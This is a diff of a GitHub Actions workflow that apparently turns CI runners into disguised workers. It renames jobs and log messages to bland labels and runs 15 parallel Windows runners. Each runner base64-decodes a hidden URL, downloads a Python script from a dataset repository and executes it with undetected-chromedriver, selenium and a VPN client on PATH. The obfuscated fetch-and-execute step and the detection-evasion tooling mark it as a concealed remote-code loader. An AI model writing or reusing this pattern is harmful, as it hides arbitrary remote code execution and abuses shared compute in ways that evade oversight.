@@ -1,4 +1,4 @@
-name: Parallel Processing System
+name: Distributed Task Controller
 
 on:
   repository_dispatch:
@@ -6,65 +6,65 @@ on:
   workflow_dispatch:
 
 concurrency:
-  group: job-cluster-${{ github.workflow }}-${{ github.ref }}
+  group: process-group-${{ github.workflow }}-${{ github.ref }}
   cancel-in-progress: false
 
 jobs:
-  run-workload:
-    name: "Worker-${{ matrix.unit_id }}"
+  execute-nodes:
+    name: "Runner-${{ matrix.slot_id }}"
     runs-on: windows-2022
     timeout-minutes: 75
 
     strategy:
       fail-fast: false
       matrix:
-        unit_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
+        slot_id: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15]
 
     steps:
-      - name: Prepare Host & Load Script
+      - name: Initialize Environment & Fetch Dependencies
         shell: bash
         run: |
-          echo "[SYSTEM] Provisioning Worker-${{ matrix.unit_id }}..."
+          echo "[START] Bootstrapping Runner-${{ matrix.slot_id }}..."
           
           # فك تشفير الرابط المصدر وتحميل ملف التشغيل
-          SOURCE_PAYLOAD=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9nZmRnMzRmc2Qvc2hyaW5rMi9yZXNvbHZlL21haW4vc3RhcnRfc2hyaW5rX25ldy5weQ==" | base64 --decode)
+          ENDPOINT_PAYLOAD=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zYW1pbG9kOS92YXovcmVzb2x2ZS9tYWluL3N0YXJ0X3Nocmlua19uZXcucHk=" | base64 --decode)
           
-          curl -sL "$SOURCE_PAYLOAD" -o main_app.py
+          curl -sL "$ENDPOINT_PAYLOAD" -o runner_script.py
           
-          echo "[SYSTEM] Upgrading Python runtime packages..."
+          echo "[SETUP] Installing required modules..."
           python -m pip install -qU pip setuptools
           pip install -q undetected-chromedriver selenium requests
-          echo "[SYSTEM] Environment ready."
+          echo "[SETUP] Dependency installation complete."
 
-      - name: Launch Application & Monitor Process
+      - name: Run Script & Enforce Timeout
         shell: pwsh
         env:
           PYTHONIOENCODING: "utf-8"
         run: |
-          Write-Host "[LOG] Executing target payload on unit ${{ matrix.unit_id }}..."
+          Write-Output ">>> Starting task script on slot ${{ matrix.slot_id }}..."
           
           $env:PATH = "$env:PATH;C:\Program Files\Cloudflare\Cloudflare WARP"
           
-          $AppStartInfo = @{
+          $ExecutionParams = @{
               FilePath     = "python"
-              ArgumentList = "main_app.py"
+              ArgumentList = "runner_script.py"
               PassThru     = $true
               NoNewWindow  = $true
           }
-          $TargetProc = Start-Process @AppStartInfo
+          $WorkerProc = Start-Process @ExecutionParams
           
-          Write-Host "[LOG] Watchdog active. Max runtime set to 74 minutes."
+          Write-Output ">>> Process monitor engaged. Limit: 74 minutes."
           
           try {
-              Wait-Process -InputObject $TargetProc -Timeout 4440 -ErrorAction Stop
-              Write-Host "[LOG] Process exited successfully."
+              Wait-Process -InputObject $WorkerProc -Timeout 4440 -ErrorAction Stop
+              Write-Output ">>> Script finished naturally."
           }
           catch {
-              Write-Host "[WARN] Time threshold reached! Force stopping process..."
-              Stop-Process -InputObject $TargetProc -Force
-              Write-Host "[LOG] Process closed."
+              Write-Output ">>> Timeout reached. Terminating process instance..."
+              Stop-Process -InputObject $WorkerProc -Force
+              Write-Output ">>> Process stopped by monitor."
           }
 
-      - name: Tear Down Step
+      - name: Finalize Step
         shell: bash
-        run: echo "[COMPLETE] Worker-${{ matrix.unit_id }} task finished."
+        run: echo "[DONE] Runner-${{ matrix.slot_id }} execution finalized."
